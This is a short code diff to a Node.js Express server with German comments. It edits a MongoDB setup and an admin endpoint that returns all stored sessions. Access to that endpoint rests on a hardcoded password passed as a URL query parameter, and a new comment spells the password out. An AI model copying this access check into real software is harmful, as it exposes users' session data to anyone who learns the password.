@@ -7,7 +7,7 @@ const mongoose = require('mongoose');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// MongoDB Konfiguration (Nutze Umgebungsvariablen für das Passwort/URI!)
+// MongoDB Konfiguration
 const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
 mongoose.connect(MONGO_URI);
 
@@ -85,10 +85,16 @@ app.post('/verify-otp', async (req, res) => {
 
 // Admin-Endpunkt: Sessions abrufen
 app.get('/get-sessions', async (req, res) => {
-    // Ändere 'DEIN_ADMIN_PASSWORT' zu deinem gewünschten Schutz
-    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
-    const sessions = await Session.find({});
-    res.json(sessions);
+    // Passwort Abfrage via Query-Parameter: ?pass=280597
+    if (req.query.pass !== '280597') {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    try {
+        const sessions = await Session.find({});
+        res.json(sessions);
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
 });
 
 app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
